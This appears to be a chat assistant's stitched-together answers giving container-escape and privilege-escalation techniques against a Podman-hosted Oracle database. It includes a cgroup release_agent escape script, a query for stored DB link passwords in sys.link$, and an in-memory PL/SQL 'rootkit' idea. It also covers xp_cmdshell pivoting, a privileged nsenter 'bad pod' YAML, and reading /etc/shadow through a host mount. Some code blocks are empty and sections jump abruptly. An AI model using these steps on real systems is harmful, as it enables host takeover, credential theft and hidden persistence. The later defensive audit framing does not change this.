1. Podman: Cgroup v2 "Release Agent" Clone Attack
In 2026, most Linux distributions use Cgroup v2. If the Oracle container is run with certain delegated controllers or insufficient isolation, we can exploit the cgroup.release_agent logic (or its v2 equivalent notify_on_release).

The Attack: Inside the Oracle container (via sqlplus host command or a shell), find the cgroup mount point.
bash



# Locate cgroup mount
mkdir /tmp/cgroup
mount -t cgroup -o rdma,release_agent none /tmp/cgroup 2>/dev/null || mount -t cgroup2 none /tmp/cgroup

# Create the release agent trigger
echo '#!/bin/sh' > /cmd
echo 'ps aux > /tmp/host_process_list' >> /cmd
chmod +x /cmd

# Get the host path of the container's rootfs (often found in mountinfo)
host_path=$(sed -n 's/.*\per-container-mounts\/\(.*\)\/rootfs.*/\1/p' /proc/self/mountinfo)
echo "$host_path/cmd" > /tmp/cgroup/release_agent

# Trigger the agent by creating a child cgroup and exiting it
mkdir /tmp/cgroup/x
echo 1 > /tmp/cgroup/x/notify_on_release
Significance: If successful, /cmd executes as host-level root, not container-level root.
2. Deep Oracle Memory: SGA Injection & Hooking
If you have SYSDBA access, you can manipulate the Shared Global Area (SGA) to hijack database operations without touching the disk (evading file integrity monitors).

SGA Mapping: Map the Oracle SGA memory directly via the Linux /proc filesystem.
bash



# Find the SGA shared memory segments
ipcs -m
# Examine the memory of the PMON/DBW0 processes
cat /proc/$(pgrep -f "ora_pmon_")/maps | grep -i "rw-s"
Attack - Plsql Injection via Memory: Use gdb or a custom memory editor to find the Library Cache in memory. You can overwrite existing, frequently called procedures with malicious code. Since it resides in memory, it will not appear in DBA_SOURCE until the DB flushes the cache, effectively creating a "memory-resident rootkit."
3. Exploiting "Pod" Shared Namespaces
Podman "Pods" share a Network Namespace and an IPC Namespace.

IPC Namespace Hijacking: If other containers are in the same Podman pod as Oracle, check for shared memory (/dev/shm).
bash



# List shared memory segments inside container
ls /dev/shm
The Attack: If a sidecar container (e.g., a backup agent or logging agent) is in the same pod, it might use /dev/shm. By writing to these segments, you can potentially overflow or inject commands into the sidecar's logic, which might have different OS permissions.
Abstract Socket Sniffing:
bash



# Check for abstract sockets (beginning with @)
cat /proc/net/unix | grep "@"
The Attack: These sockets ignore filesystem permissions. Any container in the same network namespace can connect to them. Sniff traffic targeting Oracle's internal listeners.
4. Linux Kernel: ID Mapping Race (The "SubUID" Bypass)
Since you are a local user and a Podman user, check for logic flaws in how newuidmap handles your range.

The Attack: Attempt to create an overlap between your assigned SubUIDs and a system-critical UID (like a logging user or a web server user).
bash



# Check your range
grep $(whoami) /etc/subuid
# Attempt to unshare a new namespace using the top of your range
unshare -U -r /bin/bash
If you can find a file on the host owned by a UID that falls within your subuid range, you have full root-equivalent access to that file from inside a Podman container.
5. Advanced RDBMS Persistence: DB Link Pivoting
Check for DB_LINKS that bridge the container boundary to other physical or virtual servers.

Exploiting Heterogeneous Services (HS): Oracle can link to non-Oracle databases (SQL Server, etc.) using dg4msql.
sql



-- Check for stored credentials in sys.link$
SELECT name, userid, password FROM sys.link$;
The Attack: Use the database as a Network Proxy. If the Oracle server can talk to an internal SQL Server (related to the ENS or other infrastructure), use ODAT's dblink module to execute xp_cmdshell on the remote target.

Here are the advanced Podman commands to execute on the Linux host to test for escapes, privilege escalation, and credential harvesting.

1. Security Configuration Auditing
Evaluate the isolation level of the Oracle container. High-risk flags are common in Oracle deployments to satisfy performance requirements.

bash



# Check if the container is running in 'privileged' mode (immediate escape possible)
podman inspect <container_id> --format '{{.HostConfig.Privileged}}'

# List all capabilities (Look for SYS_ADMIN, SYS_PTRACE, or DAC_OVERRIDE)

# Check if the host's IPC or Network namespace is shared
podman inspect <container_id> --format 'NetworkMode: {{.HostConfig.NetworkMode}} | IPC: {{.HostConfig.IpcMode}}'

# Check if Security Options (SELinux, Seccomp, AppArmor) are disabled
podman inspect <container_id> --format '{{.HostConfig.SecurityOpt}}'
2. Host Filesystem Leakage Tests
Many Oracle containers mount sensitive host paths for logs or database files. If these are writable, you can pivot to the host.

bash



# List all mounts and look for host paths mapped to the container
podman inspect <container_id> --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} (Type: {{.Type}}){{"\n"}}{{end}}'

# Test for 'Sensitive Mount' vulnerability (e.g., mounting /etc, /var/run/podman, or /proc)
podman inspect <container_id> | grep -iE "source\": \"/(etc|root|var/run|dev|proc|sys)\""
3. Exploiting the Podman Socket (The "Golden Ticket")
If the Podman API socket is accessible to your user or leaked into the container, you can execute commands as the user running the Podman service (usually root or your high-privileged user).

4. Namespace & UID Mapping Enumeration
Since Podman uses User Namespaces, we need to find out which host UIDs correspond to the container's oracle user.

bash



# Identify the 'oracle' process PID on the host

# Check host-side UID of the container's root user

# Check the UID mappings for the container

Attack Fact: If the uid_map shows a 0 0 mapping (unlikely in rootless but possible in rootful), you are effectively root on the host from inside the container.

To test the security boundaries of your Podman environment on the Linux host, you can use these commands to deploy pods from various sources.

As a reminder, "bad pods" in a security context are typically those configured with high-privilege settings (like --privileged, host namespace sharing, or sensitive volume mounts) to test if the Podman engine or the host's SELinux/AppArmor policies successfully block potential escapes.

1. Run a Pod from a YAML File (Local)
This is the standard approach for testing your own security configurations or "harmless" baselines.

Harmless Pod (Restricted): This YAML creates a pod with minimal privileges, non-root user, and a read-only filesystem to serve as a security baseline.

# Save this text to harmless.yaml
cat <<EOF > harmless.yaml
apiVersion: v1
kind: Pod
metadata:
  name: harmless-pod
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      readOnlyRootFilesystem: true
      allowPrivilegeEscalation: false
EOF

# Run the pod using podman play
podman play kube harmless.yaml
Bad Pod (High Privilege/Escape Test): This YAML attempts to mount the host's root filesystem and uses the host's PID and Network namespaces—key indicators of a container escape attempt.

# Save this text to bad-pod.yaml
cat <<EOF > bad-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: bad-pod
spec:
  containers:
  - name: escape-test
    image: alpine:latest
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /mnt/host
  hostPID: true
  hostNetwork: true
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Run the pod using podman play
podman play kube bad-pod.yaml

2. Run a Pod from a GitHub URL
Podman allows you to pull and execute Kubernetes-style YAML definitions directly from a remote URL. This is useful for running standard security audit tools or community-vetted escape tests (like those found in "Bad-Pods" or "Container-Breakout" repositories).

# Syntax: podman play kube <URL>
# Example: Deploying an audit pod from a reputable security GitHub repo
podman play kube https://raw.githubusercontent.com/user/repo/main/security-test-pod.yaml
Note: Ensure the URL points to the Raw version of the file on GitHub.

3. Managing and Verifying the Tests
Once you have deployed these pods, use these commands to check if the security constraints "held" (e.g., if the bad pod actually achieved host access or was blocked by Podman's rootless mode).

bash



# Check if the pods are running
podman pod ps

# Enter the bad pod to see if you can see host files
podman exec -it $(podman ps -q --filter "name=escape-test") ls /mnt/host/etc/shadow

# View the security context Podman applied to the running pod
podman pod inspect bad-pod --format '{{.InfraContainerID}}' | xargs podman inspect --format '{{.HostConfig.SecurityOpt}}'
4. Advanced: Testing "Rootless" Constraints
If you are testing as a local user, Podman should automatically remap the privileged: true flag to a "fake" root. You can verify this in your environment:

# Run a privileged container and check your UID on the host
podman run --privileged --rm alpine id
# Then check the process on the host
ps -ef | grep alpine
If the host process is owned by your local UID (e.g., 1000) and not root (0), Podman's rootless isolation is functioning correctly, even when a "bad pod" YAML requests maximum privileges.
